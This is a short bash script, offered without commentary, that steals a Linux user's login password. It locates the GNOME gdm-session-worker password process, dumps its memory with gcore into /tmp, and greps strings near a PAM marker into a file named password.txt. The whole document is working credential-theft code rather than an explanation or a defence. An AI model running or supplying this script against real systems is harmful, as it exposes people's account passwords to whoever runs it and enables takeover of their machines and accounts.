#! /bin/bash

#get gdm-session-worker [pam/gdm-password] process memory

#account for 4 or 3 digit pid
PID1="$(ps aux | grep password | head -n 1 | cut -d' ' -f 7)"
PID2="$(ps aux | grep password | head -n 1 | cut -d' ' -f 8)"

gcore -o /tmp/dump $PID1 >& /dev/null
gcore -o /tmp/dump $PID2 >& /dev/null

strings /tmp/dump* | grep -B 10 -A 10 "_pammodutil_getpwnam_root_1" > password.txt
echo "Password located somewhere within password.txt"
